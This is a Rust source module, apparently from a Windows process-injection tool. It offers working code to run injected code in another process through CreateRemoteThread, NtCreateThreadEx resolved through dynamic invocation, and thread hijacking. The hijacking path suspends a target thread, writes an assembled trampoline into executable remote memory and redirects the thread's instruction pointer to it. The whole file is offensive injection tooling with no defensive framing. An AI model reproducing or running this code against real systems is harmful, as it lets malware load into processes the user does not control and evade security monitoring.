use std::{ffi::c_void, ptr};

use dinvk::{data::NtCreateThreadEx, dinvoke};
use dynasmrt::{dynasm, DynasmApi, DynasmLabelApi};
use std::mem;

use windows::core::w;
use windows::Win32::Foundation::{CloseHandle, GetLastError};
use windows::Win32::System::Diagnostics::Debug::{FlushInstructionCache, GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_ALL_AMD64, CONTEXT_ALL_X86, CONTEXT_CONTROL_AMD64, CONTEXT_CONTROL_X86, CONTEXT_FULL_AMD64, CONTEXT_FULL_X86, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86};
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
use windows::Win32::System::Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use windows::Win32::System::Threading::{GetProcessId, IsWow64Process, OpenThread, ResumeThread, SuspendThread, WaitForSingleObject, THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME};
use windows::Win32::{
    Foundation::HANDLE,
    System::{
        LibraryLoader::GetModuleHandleW,
        Threading::{CreateRemoteThread, THREAD_ALL_ACCESS}
    }
};

use crate::utils::to_wide;


#[derive(Debug, Clone)] // todo: clone shouldnt be needed
pub enum ShellcodeExecution {
    CreateRemoteThread,
    NtCreateThreadEx,
    ThreadHijacking
}

pub fn execute(shellcode_execution_method: ShellcodeExecution, process_handle: HANDLE, inject_func_addr: usize, dll_path_mem_alloc: *mut c_void) -> Result<HANDLE, Box<dyn std::error::Error>> {
    match shellcode_execution_method {
        ShellcodeExecution::CreateRemoteThread => execute_create_remote_thread(process_handle, inject_func_addr, dll_path_mem_alloc),
        ShellcodeExecution::NtCreateThreadEx => execute_nt_create_thread_ex(process_handle, inject_func_addr, dll_path_mem_alloc),
        ShellcodeExecution::ThreadHijacking => execute_thread_hijacking(process_handle, inject_func_addr, dll_path_mem_alloc)
    }
}

fn execute_create_remote_thread(
    process_handle: HANDLE,
    inject_func_addr: usize,
    dll_path_mem_alloc: *mut c_void
) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let thread = unsafe {
        CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(std::mem::transmute(inject_func_addr)),
            Some(dll_path_mem_alloc),
            0,
            None
        )
    }?;

    Ok(thread)
}

fn execute_nt_create_thread_ex(
    process_handle: HANDLE,
    inject_func_addr: usize,
    dll_path_mem_alloc: *mut c_void
) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let ntdll = unsafe { GetModuleHandleW(w!("ntdll.dll"))? };
    let mut thread: HANDLE = HANDLE::default();
    let pthread: *mut *mut c_void = &mut thread.0;

    let ntstatus: i32 = dinvoke!(
        ntdll.0,
        "NtCreateThreadEx",
        NtCreateThreadEx,
        pthread,
        THREAD_ALL_ACCESS.0,
        ptr::null_mut(),
        process_handle.0,
        std::mem::transmute(inject_func_addr),
        dll_path_mem_alloc,
        0,
        0,
        0,
        0,
        ptr::null_mut()
    )
    .ok_or_else(|| "NtCreateThreadEx not found or resolved incorrectly")?;

    if ntstatus != 0 {
        return Err(format!("NtCreateThreadEx failed with NTSTATUS: {:#x}", ntstatus).into());
    }

    Ok(thread)
}

fn write_dll_path(dll_path: &str, process_handle: HANDLE) -> Result<*mut c_void, Box<dyn std::error::Error>> {
    let dll_path_wide = to_wide(dll_path);
    let path_size_in_bytes = dll_path_wide.len() * 2;

    let dll_path_mem_alloc = unsafe {
        VirtualAllocEx(
            process_handle, 
            None, 
            path_size_in_bytes, 
            MEM_RESERVE | MEM_COMMIT, 
            PAGE_EXECUTE_READWRITE
        )
    };

    if dll_path_mem_alloc.is_null() {
        return Err("Allocation failed".into());
    }

    unsafe {
        WriteProcessMemory(
            process_handle,
            dll_path_mem_alloc,
            dll_path_wide.as_ptr() as *const c_void,
            path_size_in_bytes,
            None
        )
    }?;

    Ok(dll_path_mem_alloc)
}

#[repr(align(16))]
struct Align16<T>(T);

fn create_trampoline_stub(
    dll_path_ptr: u64,
    inject_func_ptr: u64,
    original_rip: u64
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut ops = dynasmrt::x64::Assembler::new()?;

    dynasm!(ops
        ; .arch x64
        ; pushfq  // save flags

        ; push rax  // push registers
        ; push rcx
        ; push rdx
        ; push r8
        ; push r9
        ; push r10
        ; push r11

        ; sub rsp, 0x28  // shadow space + alignment

        ; mov rcx, QWORD dll_path_ptr as i64  // inject
        ; mov rax, QWORD inject_func_ptr as i64
        ; call rax

        ; add rsp, 0x28  // cleanup stack
        ; pop r11
        ; pop r10
        ; pop r9
        ; pop r8
        ; pop rdx
        ; pop rcx
        ; pop rax

        ; popfq  // restore flags

        ; mov rax, QWORD original_rip as i64 // jump back to original RIP
        ; jmp rax
    );

    let buf = ops.finalize().unwrap();
    println!("{:#04X?}, length: {}", buf.to_vec(), buf.to_vec().len());
    Ok(buf.to_vec())
}

fn execute_thread_hijacking(
    process_handle: HANDLE,
    inject_func_addr: usize,
    dll_path_mem_alloc: *mut c_void
) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let thread_handle = get_thread_handle(process_handle)?;

    if unsafe { SuspendThread(thread_handle) } == u32::MAX {
        unsafe { CloseHandle(thread_handle) };
        return Err("Failed to suspend thread".into());
    }

    let mut context = Align16 ( CONTEXT {
        ContextFlags: CONTEXT_ALL_AMD64 | CONTEXT_FULL_AMD64 | CONTEXT_CONTROL_AMD64 | CONTEXT_INTEGER_AMD64,
        ..Default::default()
    });
    
    if unsafe { GetThreadContext(thread_handle, &mut context.0) }.is_err() {
        unsafe { ResumeThread(thread_handle) };
        unsafe { CloseHandle(thread_handle) };
        return Err("Failed to get thread context".into());
    }

    // let remote_loadlibrary_addr = get_remote_loadlibrary_address(process_handle)?;
    // println!("DLL path addr: {:#x}", dll_path_mem_alloc as u64);
    // println!("LoadLibrary addr: {:#x}", remote_loadlibrary_addr as u64);
    // println!("Original RIP: {:#x}", context.0.Rip);

    let stub = create_trampoline_stub(
        dll_path_mem_alloc as u64, 
        inject_func_addr as u64, 
        context.0.Rip
    )?;

    let remote_shellcode = unsafe {
        VirtualAllocEx(
            process_handle,
            None,
            stub.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_shellcode.is_null() {
        unsafe { ResumeThread(thread_handle) };
        unsafe { CloseHandle(thread_handle) };
        return Err("Failed to allocate remote shellcode".into());
    }
    
    unsafe {
        WriteProcessMemory(
            process_handle,
            remote_shellcode,
            stub.as_ptr() as _,
            stub.len(),
            None,
        )?;

        FlushInstructionCache(process_handle, Some(remote_shellcode), stub.len())?;
    }

    context.0.Rip = remote_shellcode as u64;

    // new context
    if unsafe { SetThreadContext(thread_handle, &context.0) }.is_err() {
        unsafe { ResumeThread(thread_handle) };
        unsafe { CloseHandle(thread_handle) };
        return Err("Failed to set thread context".into());
    }

    let resume_result = unsafe { ResumeThread(thread_handle) };
    if resume_result == u32::MAX {
        unsafe { CloseHandle(thread_handle) };
        return Err("Failed to resume thread".into());
    }

    println!("Thread resumed successfully (previous suspend count: {})", resume_result);

    Ok(thread_handle)
}

fn get_thread_handle(process_handle: HANDLE) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let target_pid = unsafe { GetProcessId(process_handle) };
    if target_pid == 0 {
        return Err("Failed to get process ID".into());
    }

    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }?;
    let mut thread_entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    let mut thread_id: u32 = 0;
    unsafe { Thread32First(snapshot, &mut thread_entry) }?;

    while unsafe { Thread32Next(snapshot, &mut thread_entry) }.is_ok() {
        if thread_entry.th32OwnerProcessID == target_pid {
            thread_id = thread_entry.th32ThreadID;
            break;
        }
    }
    unsafe { CloseHandle(snapshot) }?;
    if thread_id == 0 {
        return Err("No thread found in target process".into());
    }

    println!("thread_id: {thread_id}");

    unsafe {
        Ok(
            OpenThread(
                THREAD_ALL_ACCESS,
                false,
                thread_id
            )?
        )
    }
}